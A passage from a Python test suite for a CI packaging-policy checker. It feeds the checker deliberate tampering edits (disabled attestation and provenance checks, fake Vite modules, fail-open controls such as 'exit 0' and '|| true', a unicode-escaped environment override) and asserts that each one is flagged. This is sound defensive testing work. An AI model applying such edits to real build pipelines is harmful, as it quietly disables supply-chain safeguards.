            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "        nonlocal total_size\n",
            "        nonlocal total_size\n"
            "        os.listdir = lambda _descriptor: ()\n",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

    def test_python_toolchain_node_consumers_and_integrations_are_semantic(self) -> None:
        mutations = (
            (
                "formal_before_pack",
                '"pythonToolchain",\n      "inputDigests"',
                '"inputDigests"',
            ),
            (
                "formal_before_pack",
                "validatePythonToolchainArtifact(root, manifest, repositoryRoot);",
                "void manifest;",
            ),
            (
                "formal_before_pack",
                'path.join(repositoryRoot, "backend", "uv.lock")',
                'path.join(repositoryRoot, "backend", "unreviewed.lock")',
            ),
            (
                "common_audit",
                '"pythonBuildToolchainPath",',
                "",
            ),
            (
                "prepare",
                "const pythonToolchain = pythonBuild.pythonToolchain;",
                "const pythonToolchain = {};",
            ),
            (
                "bundle_audit",
                "const pythonManifest = python.manifest;",
                'const pythonManifest = loadJson(path.join(sidecarRoot, "build-manifest.json"), "Python manifest");',
            ),
            (
                "before_pack_tests",
                "binds Python toolchain summary, source locks, and canonical artifact inventory",
                "accepts unbound Python toolchain evidence",
            ),
            (
                "engineering_packaging_tests",
                "pythonBuildToolchainPath:",
                "unreviewedToolchainPath:",
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("Python toolchain" in error for error in errors),
                    errors,
                )

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["components"]["properties"]["pythonSidecar"][
            "required"
        ].remove("pythonToolchain")
        current["schema"] = schema
        with synchronized_input_document_summaries(current, "schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("manifest schema" in error for error in errors), errors)

    def test_exact_tag_ref_fixture_is_bound_and_executed_by_policy_target(self) -> None:
        current = inputs()
        changed(
            current,
            "exact_git_checker",
            'f"refs/tags/{arguments.expected_tag}^{{commit}}"',
            'f"{arguments.expected_tag}^{{commit}}"',
        )
        with synchronized_input_document_summaries(current, "exact_git_checker"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("exact Git provenance checker missing" in error for error in errors),
            errors,
        )

        current = inputs()
        changed(
            current,
            "exact_git_checker_tests",
            'self._git(root, "branch", "v1.2.3", "HEAD")',
            'self._git(root, "branch", "not-the-tag", "HEAD")',
        )
        with synchronized_input_document_summaries(
            current,
            "exact_git_checker_tests",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("exact Git provenance tag tests missing" in error for error in errors),
            errors,
        )

        current = inputs()
        changed(
            current,
            "makefile",
            "\t$(PYTHON) -B -m unittest tools.tests.test_check_exact_git_provenance\n",
            "\t@true\n",
        )
        self.assertIn(
            "packaged-smoke policy Make target dependency, command, or order drifted",
            CHECKER.validate_policy(current),
        )

    def test_exact_source_builders_attestations_and_race_fixture_are_semantic(self) -> None:
        mutations = (
            (
                "desktop_entrypoint_builder",
                'entryPoints: ["lcf-reviewed:desktop/src/main/index.ts"]',
                'entryPoints: ["desktop/src/main/index.ts"]',
                "Desktop exact entrypoint builder exact-source contract",
            ),
            (
                "desktop_entrypoint_builder",
                'writeCanonicalJson(path.join(buildRoot, "entrypoint-build.json"), attestation);',
                "void attestation;",
                "Desktop exact entrypoint builder exact-source contract",
            ),
            (
                "renderer_builder",
                "input: `${VIRTUAL_PREFIX}web/src/main.tsx`",
                'input: path.join(webRoot, "src", "main.tsx")',
                "renderer exact builder exact-source contract",
            ),
            (
                "renderer_builder",
                "writeCanonicalJson(path.join(distRoot, ATTESTATION_NAME), attestation);",
                "void attestation;",
                "renderer exact builder exact-source contract",
            ),
            (
                "stage_renderer",
                "inputSnapshotSha256: sourceBuild.inputsSha256",
                'inputSnapshotSha256: "0".repeat(64)',
                "renderer stage",
            ),
            (
                "stage_renderer",
                "packageLockSha256: sourceBuild.packageLockSha256",
                "packageLockSha256: sha256File(PACKAGE_LOCK)",
                "renderer stage",
            ),
            (
                "stage_renderer",
                "validateSource(source, release, environment);",
                "void release;",
                "held-descriptor revalidation",
            ),
            (
                "stage_renderer",
                "rename(previous, destination);",
                "fs.rmSync(previous, { recursive: true });",
                "renderer stage rollback contract",
            ),
            (
                "engineering_packaging_tests",
                "selects reviewed Git object bytes before the exact entrypoint build",
                "uses live Desktop source files",
                "engineering packaging tests",
            ),
            (
                "before_pack_tests",
                "rejects hostile local Git config before provenance commands can use it",
                "uses ambient local Git configuration",
                "beforePack tests",
            ),
            (
                "renderer_packaging_tests",
                "refuses source drift after attestation without replacing staged output",
                "accepts source drift after attestation",
                "renderer packaging tests",
            ),
            (
                "renderer_packaging_tests",
                "restores the old staging directory when atomic publish fails",
                "drops the old staging directory when atomic publish fails",
                "renderer packaging tests",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_renderer_test_must_use_real_vite_and_plugin_injection(self) -> None:
        mutations = (
            (
                "const viteImplementation = await import(",
                "const viteImplementation = Promise.resolve(",
            ),
            (
                'path.join(repositoryRoot, "web", "node_modules", "vite", "dist", "node", "index.js")',
                'path.join(repositoryRoot, "desktop", "tests", "fake-vite.js")',
            ),
            (
                "const reactPluginModule = await import(",
                "const reactPluginModule = Promise.resolve(",
            ),
            (
                "      viteImplementation,",
                "      viteImplementation: { version: \"7.3.6\", build: vi.fn() },",
            ),
            (
                "      reactPluginFactory: reactPluginModule.default,",
                "      reactPluginFactory: () => ({ name: \"fake-react\" }),",
            ),
            (
                'expect(outputText).not.toContain("transient-renderer-marker")',
                'expect(outputText).toBeDefined()',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "renderer_packaging_tests", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "renderer_packaging_tests",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("real Vite/ABA injection" in error for error in errors),
                    errors,
                )

    def test_renderer_producer_audit_manifest_and_bundle_chain_is_semantic(self) -> None:
        mutations = (
            (
                "audit_renderer",
                "repositoryTree: manifest.source.repositoryTree",
                'repositoryTree: "0".repeat(40)',
            ),
            (
                "prepare",
                "inputSnapshotSha256: renderer.inputSnapshotSha256",
                'inputSnapshotSha256: "0".repeat(64)',
            ),
            (
                "prepare",
                "readReviewedGitBlob(repositoryRoot, rendererPackageLock.objectId)",
                "fs.readFileSync(RENDERER_PACKAGE_LOCK_PATH)",
            ),
            (
                "common_audit",
                "renderer.repositoryTree !== source.tree",
                "false",
            ),
            (
                "before_pack",
                "manifest.components.renderer.inputSnapshotSha256 !==",
                "false &&",
            ),
            (
                "bundle_audit",
                "manifest.components.renderer.sourceSnapshotSha256 !==",
                "false &&",
            ),
            (
                "audit_renderer",
                "manifest.source.packageLockSha256 !== expectedPackageLockSha256",
                "false",
            ),
            (
                "before_pack",
                "expectedPackageLockSha256: source.rendererPackageLockSha256",
                'expectedPackageLockSha256: "0".repeat(64)',
            ),
            (
                "bundle_audit",
                "expectedPackageLockSha256: source.rendererPackageLockSha256",
                'expectedPackageLockSha256: "0".repeat(64)',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("producer/consumer attestation chain" in error for error in errors),
                    errors,
                )

        for field in (
            "repositoryTree",
            "sourceSnapshotSha256",
            "packageLockSha256",
            "inputSnapshotSha256",
            "inputFiles",
        ):
            with self.subTest(schema_field=field):
                current = inputs()
                schema = copy.deepcopy(current["renderer_schema"])
                schema["properties"]["source"]["required"].remove(field)
                current["renderer_schema"] = schema
                with synchronized_input_document_summaries(current, "renderer_schema"):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("renderer manifest schema" in error for error in errors))

    def test_hostile_local_git_metadata_and_raw_index_checks_are_semantic(self) -> None:
        mutations = (
            (
                "prepare",
                "  assertSafeLocalGitMetadata(repositoryRoot);\n",
                "",
            ),
            (
                "prepare",
                '        "--no-includes",',
                '        "--includes",',
            ),
            (
                "prepare",
                'const EXACT_LOCAL_GIT_CONFIG_VALUES = Object.freeze({',
                'const UNREVIEWED_LOCAL_GIT_CONFIG_VALUES = Object.freeze({',
            ),
            (
                "prepare",
                '"gc.auto": Object.freeze(["0"])',
                '"gc.auto": Object.freeze(["0", "1"])',
            ),
            (
                "prepare",
                "return reviewedValues.includes(value.toLowerCase());",
                "return true;",
            ),
            (
                "prepare",
                '        "--list"\n',
                '        "--name-only",\n        "--list"\n',
            ),
            (
                "prepare",
                "      raw[0] !== 0x48 ||",
                "      false ||",
            ),
            (
                "prepare",
                "          fs.constants.O_RDONLY | fs.constants.O_NOFOLLOW",
                "          fs.constants.O_RDONLY",
            ),
            (
                "prepare",
                "  validateRawRepositoryState(repositoryRoot, inventory);\n",
                "",
            ),
            (
                "before_pack_tests",
                "await expect(readFile(filterMarker)).rejects.toThrow();",
                "await readFile(filterMarker)",
            ),
            (
                "before_pack_tests",
                'git("config", "--local", "gc.auto", "1")',
                'git("config", "--local", "gc.auto", "0")',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "hostile local Git metadata" in error
                        or "raw Git index/worktree" in error
                        or "beforePack tests" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_python_candidate_capability_spans_producer_consumers_and_publish(self) -> None:
        mutations = (
            (
                "build_script",
                "def _verify_held_bundle_candidate(\n",
                "def _ignore_held_bundle_candidate(\n",
            ),
            (
                "build_script",
                "        bundle_capability = _create_bundle_capability(\n",
                "        bundle_capability = None  # capability removed\n",
            ),
            (
                "build_script",
                "            bundle_descriptor=bundle_capability.descriptor,\n",
                "            bundle_descriptor=None,\n",
            ),
            (
                "build_script",
                "        _validate_bundle_capability(\n"
                "            scratch,\n"
                '            error_message="Python sidecar bundle changed during frozen smoke",\n'
                "        )\n",
                "        pass\n",
            ),
            (
                "build_script",
                "        _publish_owned_bundle(\n",
                "        publish_staging(\n",
            ),
            (
                "build_script",
                "        def final_verifier(candidate: Path) -> dict[str, int]:\n",
                "        def final_verifier(_candidate: Path) -> dict[str, int]:\n",
            ),
            (
                "build_script",
                "            result = audit.audit_bundle(\n"
                "                candidate,\n",
                "            result = audit.audit_bundle(\n"
                "                bundle_capability.path,\n",
            ),
            (
                "build_script",
                "            os.close(bundle.descriptor)\n",
                "            pass  # held bundle descriptor leaked\n",
            ),
            (
                "build_script",
                "        _bundle_capability_path(bundle)\n"
                "        _validate_source_snapshot(scratch)\n"
                "        # Ownership transfers only after every fallible acquisition check.\n"
                "        # Before this assignment the caller remains the sole fd owner.\n"
                "        scratch.bundle = bundle\n",
                "        scratch.bundle = bundle\n"
                "        _bundle_capability_path(bundle)\n"
                "        _validate_source_snapshot(scratch)\n",
            ),
            (
                "python_packaging_tests",
                "test_bundle_capability_precedes_producer_and_fd_consumers_ignore_root_aba",
                "test_pathname_consumers_ignore_root_aba",
            ),
            (
                "python_packaging_tests",
                "test_pyinstaller_runner_validates_canonical_roots_and_closes_child_fds",
                "test_pyinstaller_runner_ignores_canonical_roots_and_leaks_child_fds",
            ),
            (
                "python_packaging_tests",
                "test_final_bundle_verifier_binds_pre_and_post_publish_candidate_paths",
                "test_final_bundle_verifier_ignores_publish_candidate_paths",
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "candidate capability" in error
                        or "pre-producer capability" in error
                        or "producer capability" in error
                        or "held candidate" in error
                        or "candidate ownership" in error
                        or "grandchild capability" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        build_script = str(current["build_script"])
        frozen = "frozen_smoke = run_frozen_smoke("
        components = "components = build_components("
        self.assertIn(frozen, build_script)
        self.assertIn(components, build_script)
        build_script = build_script.replace(frozen, "__LCF_ORDER_SWAP__", 1)
        build_script = build_script.replace(components, frozen, 1)
        build_script = build_script.replace("__LCF_ORDER_SWAP__", components, 1)
        current["build_script"] = build_script
        with synchronized_input_document_summaries(current, "build_script"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "Python sidecar held candidate producer/consumer/publish chain drifted",
            errors,
        )

        current = inputs()
        changed_last(
            current,
            "build_script",
            "            _verify_held_bundle_candidate(\n"
            "                bundle_capability,\n"
            "                candidate,\n",
            "            _verify_held_bundle_candidate(\n"
            "                bundle_capability,\n"
            "                bundle_capability.path,\n",
        )
        with synchronized_input_document_summaries(current, "build_script"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "Python sidecar held candidate producer/consumer/publish chain drifted",
            errors,
        )

    def test_reviewed_desktop_package_producer_consumer_chain_is_semantic(self) -> None:
        mutations = (
            (
                "prepare",
                "const packageMetadata = loadReviewedDesktopPackageMetadata(source);",
                'const packageMetadata = loadJson(PACKAGE_PATH, "Desktop package metadata");',
            ),
            (
                "prepare",
                "readReviewedGitBlob(repositoryRoot, desktopPackage.objectId)",
                "fs.readFileSync(path.join(repositoryRoot, DESKTOP_PACKAGE_PATH))",
            ),
            (
                "prepare",
                '        "desktopPackageSha256"',
                '        "desktopPackageDigest"',
            ),
            (
                "common_audit",
                '      "reviewedPackageSha256",\n',
                "",
            ),
            (
                "before_pack",
                "desktopApp.reviewedPackageSha256 !== source.desktopPackageSha256",
                "false",
            ),
            (
                "bundle_audit",
                "manifest.components.desktopApp.reviewedPackageSha256 !==",
                "false &&",
            ),
            (
                "engineering_packaging_tests",
                '"9.9.9-transient"',
                '"0.0.0"',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "reviewed Desktop package chain" in error
                        or "engineering packaging tests" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        desktop_app = schema["properties"]["components"]["properties"][
            "desktopApp"
        ]
        desktop_app["required"].remove("reviewedPackageSha256")
        current["schema"] = schema
        with synchronized_input_document_summaries(current, "schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("schema required properties" in error for error in errors))

    def test_standalone_python_auditor_reuses_hostile_git_boundary(self) -> None:
        mutations = (
            (
                "audit_script",
                '        expected_module = TOOLS_ROOT / "build_python_sidecar.py"\n',
                '        expected_module = Path("build_python_sidecar.py")\n',
            ),
            (
                "audit_script",
                "        build._validate_local_git_configuration(repository_root=repository_root)\n",
                "",
            ),
            (
                "audit_script",
                "        build._validate_git_info_overrides(repository_root=repository_root)\n",
                "",
            ),
            (
                "audit_script",
                "        verified = _reviewed_build_boundary()._validate_repository_state(\n",
                "        verified = _reviewed_build_boundary()._repository_tree_inventory(\n",
            ),
            (
                "python_packaging_tests",
                '@pytest.mark.parametrize("mutation", ["filter", "index-flag", "info-attributes"])',
                '@pytest.mark.parametrize("mutation", ["filter"])',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "standalone Python auditor" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["audit:python-sidecar"] = (
            "python ../tools/audit_python_sidecar.py --bundle generated/sidecar"
        )
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertIn("Desktop standalone Python auditor script drifted", errors)

        current = inputs()
        audit_run = (
            "          run_exact_npm_script desktop test\n"
            "          run_exact_npm_script desktop typecheck\n"
            "          node tools/exact_node_install.cjs discard-test"
        )
        changed(
            current,
            "formal_workflow",
            audit_run,
            "          run_exact_npm_script desktop typecheck\n"
            "          run_exact_npm_script desktop test\n"
            "          node tools/exact_node_install.cjs discard-test",
        )
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "formal workflow" in error
                or "formal exact Desktop" in error
                for error in errors
            ),
            errors,
        )

    def test_artifact_cache_release_and_app_launch_surfaces_fail(self) -> None:
        additions = (
            "      - uses: actions/upload-artifact@" + "a" * 40 + "\n",
            "      - uses: actions/cache@" + "a" * 40 + "\n",
            "      - run: gh release create v0.0.0\n",
            "      - run: /usr/bin/open 'release-smoke/App.app'\n",
            "      - run: release-smoke/App.app/Contents/MacOS/App\n",
            "      - run: spctl --assess release-smoke/App.app\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["workflow"] = str(current["workflow"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

    def test_governance_threat_boundary_and_formal_scope_are_semantic(self) -> None:
        for key, old, new in (
            (
                "trace",
                "不触发 formal Draft/promotion/publish",
                "formal release path unchanged",
            ),
            (
                "todo",
                "在 distribution/publish semantics 上与 formal release\n   隔离",
                "与 formal release 严格隔离",
            ),
            (
                "iteration",
                "shared exact provenance/build boundary",
                "legacy source staging only",
            ),
            (
                "iteration",
                "tools/{check_exact_git_provenance.py,exact_node_install.cjs,bootstrap_python_sidecar.py,build_python_sidecar.py,audit_python_sidecar.py}",
                "tools/build_python_sidecar.py",
            ),
            (
                "remediation_evidence",
                "process-level build CLI lifecycle",
                "arbitrary same-process retry is supported",
            ),
            (
                "remediation_evidence",
                "server-reviewed workflow 与 system Git/runtime",
                "repo-owned checker is the complete bootstrap TCB",
            ),
            (
                "remediation_evidence",
                "`python-sidecar-toolchain-*` 与 `lcf-python-installer.*`",
                "one unbounded scratch prefix",
            ),
            (
                "remediation_evidence",
                "cleanup-only `always()` gate",
                "combined provenance and cleanup gate",
            ),
            (
                "iteration",
                "首个 post-build cleanup-only `always()` gate",
                "final combined validation",
            ),
            (
                "remediation_evidence",
                "最后一个 repo-code step",
                "tests run before production build",
            ),
            (
                "iteration",
                "PYTHONDONTWRITEBYTECODE=1",
                "PYTHONDONTWRITEBYTECODE=0",
            ),
        ):
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "governance" in error
                        or "owned-path" in error
                        or "remediation evidence" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_python_source_urls_and_digests_are_locked(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.PYTHON_ARCHIVE_SHA256, "0" * 64)
        self.assertTrue(any("Python source lock" in error for error in CHECKER.validate_policy(current)))

    def test_python_runner_inputs_are_persisted_after_source_verification(self) -> None:
        mutations = (
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_archive}\"\n",
                "",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_hashes}\"\n",
                "",
            ),
            (
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n',
                "",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_archive}\"",
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_hashes}\"",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_hashes}\"",
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_archive}\"",
            ),
            (
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n',
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.12"\n',
            ),
            (
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n'
                '          } >> "${GITHUB_ENV}"',
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n'
                '          } >> "${GITHUB_OUTPUT}"',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertIn(
                    "workflow Python runner input binding drifted",
                    CHECKER.validate_policy(current),
                )

        current = inputs()
        binding = (
            "            printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' "
            '"${python_archive}"'
        )
        changed(current, "workflow", binding, f"{binding}\n{binding}")
        self.assertIn(
            "workflow Python runner input binding drifted",
            CHECKER.validate_policy(current),
        )

        overrides = (
            (
                "      LCF_GITHUB_CONTEXT_SHA: ${{ github.sha }}",
                "      LCF_GITHUB_CONTEXT_SHA: ${{ github.sha }}\n"
                "      LCF_PYTHON_INSTALL_ROOT: /tmp/unreviewed",
            ),
            (
                "      - name: Assemble and statically audit app directory",
                "      - name: Assemble and statically audit app directory\n"
                "        env:\n"
                "          LCF_PYTHON_DISTRIBUTION_ARCHIVE: /tmp/unreviewed",
            ),
        )
        for old, new in overrides:
            with self.subTest(override=new):
                current = inputs()
                changed(current, "workflow", old, new)
                errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow Python runner input binding drifted",
                    errors,
                )
                if "\n        env:" in new:
                    self.assertIn("workflow environment surface drifted", errors)

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Assemble and statically audit app directory",
            "      - name: Assemble and statically audit app directory\n"
            '        "env":\n'
            '          "LCF_PYTHON\\u005fINSTALL_ROOT": /tmp/unreviewed',
        )
        self.assertIn(
            "workflow document contract drifted",
            CHECKER.validate_policy(current),
        )

    def test_required_commands_cannot_be_satisfied_by_comments(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
            "        run: |\n"
            '          cd "${LCF_REVIEWED_SOURCE_ROOT}"\n'
            "          # make python-sidecar-build\n"
            "          true",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("run-step contract" in error or "required command" in error for error in errors)
        )

    def test_workflow_lifecycle_order_and_calls_survive_synchronized_hashes(self) -> None:
        mutations = (
            (
                "      - name: Enforce engineering-smoke packaging policy",
                "      - name: TEMP lifecycle step",
            ),
            (
                "          backend/.venv/bin/python -B -m pytest -q \\",
                "          true",
            ),
            (
                "          export PYTHONDONTWRITEBYTECODE=1",
                "          export PYTHONDONTWRITEBYTECODE=0",
            ),
            (
                "          python -B -m pip install --disable-pip-version-check uv==0.11.29",
                "          python -m pip install --disable-pip-version-check uv==0.11.29",
            ),
            (
                '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
                "        run: true",
            ),
            (
                "          test ! -L desktop/generated/python-sidecar-build",
                "          true",
            ),
            (
                "          ! compgen -G 'desktop/generated/python-sidecar-build-*' > /dev/null",
                "          true",
            ),
            (
                "          run_exact_npm_script web build:packaging",
                "          true",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "step" in error.lower()
                        or "lifecycle" in error.lower()
                        or "required command" in error.lower()
                        or "renderer" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        workflow = str(current["workflow"])
        workflow = workflow.replace(
            "Enforce engineering-smoke packaging policy",
            "TEMP workflow step",
            1,
        ).replace(
            "Run focused Python sidecar lifecycle tests",
            "Enforce engineering-smoke packaging policy",
            1,
        ).replace(
            "TEMP workflow step",
            "Run focused Python sidecar lifecycle tests",
            1,
        )
        current["workflow"] = workflow
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertIn("workflow step order or step universe drifted", errors)

        current = inputs()
        current["workflow"] = str(current["workflow"]) + (
            "\n      - name: Unreviewed post-test Python consumer\n"
            "        run: python tools/build_python_sidecar.py --help\n"
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "final repo-code step" in error
                or "step order or step universe" in error
                for error in errors
            ),
            errors,
        )

        current = inputs()
        workflow = str(current["workflow"])
        workflow = workflow.replace(
            "run_exact_npm_script web typecheck",
            "__LCF_RENDERER_ORDER_SWAP__",
            1,
        ).replace(
            "run_exact_npm_script web build:packaging",
            "run_exact_npm_script web typecheck",
            1,
        ).replace(
            "__LCF_RENDERER_ORDER_SWAP__",
            "run_exact_npm_script web build:packaging",
            1,
        )
        current["workflow"] = workflow
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertIn("workflow exact renderer install/build/stage order drifted", errors)

    def test_workflow_fail_open_controls_survive_synchronized_hashes(self) -> None:
        controls = (
            "exit 0",
            "return 0",
            "make packaged-smoke-policy-check || true",
            "if false; then make packaged-smoke-policy-check; fi",
            "make packaged-smoke-policy-check &",
        )
        for control in controls:
            with self.subTest(control=control):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make packaged-smoke-policy-check',
                    "        run: |\n"
                    '          cd "${LCF_REVIEWED_SOURCE_ROOT}"\n'
                    f"          {control}\n"
                    "          make packaged-smoke-policy-check",
                )
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow executable run steps contain a fail-open control",
                    errors,
                )

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Build and audit locked Python sidecar",
            "      - name: Build and audit locked Python sidecar\n"
            "        continue-on-error: true",
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("continue-on-error" in error for error in errors), errors)

    def test_post_build_cleanup_always_gate_precedes_provenance(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Validate Python scratch cleanup\n"
            "        if: ${{ always() }}",
            "      - name: Validate Python scratch cleanup",
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("always gate" in error for error in errors), errors)

        current = inputs()
        changed(
            current,
            "formal_workflow",
            "      - name: Validate Python scratch cleanup\n"
            "        if: ${{ always() }}",
            "      - name: Validate Python scratch cleanup",
        )
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("always gate" in error for error in errors), errors)

        for key, summary in (
            ("workflow", synchronized_workflow_summary),
            ("formal_workflow", synchronized_formal_workflow_summary),
        ):
            with self.subTest(key=key, mutation="framework-before-cleanup"):
                current = inputs()
                changed(
                    current,
                    key,
                    '          test -n "${RUNNER_TEMP:-}"',
                    '          test -x "${LCF_REVIEWED_BUILD_PYTHON}"\n'
                    '          test -n "${RUNNER_TEMP:-}"',
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("cleanup-only always gate" in error for error in errors),
                    errors,
                )

            with self.subTest(key=key, mutation="provenance-always"):
                current = inputs()
                changed(
                    current,
                    key,
                    "      - name: Validate Python sidecar provenance\n"
                    "        shell: bash",
                    "      - name: Validate Python sidecar provenance\n"
                    "        if: ${{ always() }}\n"
                    "        shell: bash",
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("always gate" in error for error in errors), errors)

            for old in (
                '          runner_temp_real="$(cd "${RUNNER_TEMP}" && /bin/pwd -P)"',
                '          test "$(/usr/bin/stat -f \'%u\' "${RUNNER_TEMP}")" = "$(/usr/bin/id -u)"',
                '          (( (8#${runner_temp_mode} & 0022) == 0 ))',
            ):
                with self.subTest(key=key, mutation=old):
                    current = inputs()
                    changed(current, key, old, "          true")
                    with summary(current):
                        errors = CHECKER.validate_policy(current)
                    self.assertTrue(
                        any(
                            "critical step" in error
                            or "cleanup-only always gate" in error
                            or "post-build cleanup" in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_post_build_revalidates_all_five_fixed_provenance_keys(self) -> None:

        shape_lines = (
            '[[ "${LCF_SOURCE_SHA}" =~ ^[0-9a-f]{40}$ ]]',
            '[[ "${LCF_SOURCE_TREE}" =~ ^[0-9a-f]{40}$ ]]',
            '[[ "${LCF_SOURCE_SNAPSHOT_SHA256}" =~ ^[0-9a-f]{64}$ ]]',
            '[[ "${LCF_SOURCE_DATE_EPOCH}" =~ ^[0-9]+$ ]]',
            '[[ "${LCF_RENDERER_PACKAGE_LOCK_SHA256}" =~ ^[0-9a-f]{64}$ ]]',
        )
        for line in shape_lines:
            with self.subTest(line=line):
                current = inputs()
                changed(current, "workflow", line, "true")
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "critical step" in error
                        or "bootstrap" in error
                        for error in errors
                    ),
                    errors,
                )

        for scratch_pattern in (
            '${RUNNER_TEMP}/python-sidecar-toolchain-*',
            '${RUNNER_TEMP}/lcf-python-installer.*',
        ):
            with self.subTest(scratch_pattern=scratch_pattern):
                current = inputs()
                changed(
                    current,
                    "workflow",
